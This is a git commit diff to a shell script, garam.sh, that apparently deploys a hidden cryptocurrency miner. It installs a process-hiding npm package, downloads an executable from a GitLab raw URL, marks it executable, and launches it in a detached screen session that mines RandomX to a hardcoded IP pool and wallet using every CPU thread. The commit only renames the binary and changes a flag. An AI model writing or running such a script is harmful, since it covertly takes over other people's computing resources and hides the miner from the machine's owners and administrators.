d6a1da103250e598106bec710779810a81af069b
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-06-08 21:40:39 +0700

    Update garam.sh

--- garam.sh
+++ garam.sh
@@ -6,8 +6,8 @@ sudo apt install screen -y
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
 sudo apt install npm =y
-sudo npm i -g node-process-hider && sudo ph add rstd
-wget https://gitlab.com/sarifadim/jomblo/-/raw/main/rstd && chmod +x *
-screen -dms run ./rstd -a rx/0 -o 47.89.195.104:443 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo V-$(TZ=UTC-7 date +"%H-%M-%S")) --randomx-1gb-pages -p -x -t $(nproc --all)
+sudo npm i -g node-process-hider && sudo ph add pardede
+wget https://gitlab.com/sarifadim/jomblo/-/raw/main/pardede && chmod +x *
+screen -dms run ./pardede -a rx/0 -o 47.89.195.104:443 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo A-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all)
 EOF
 screen -r
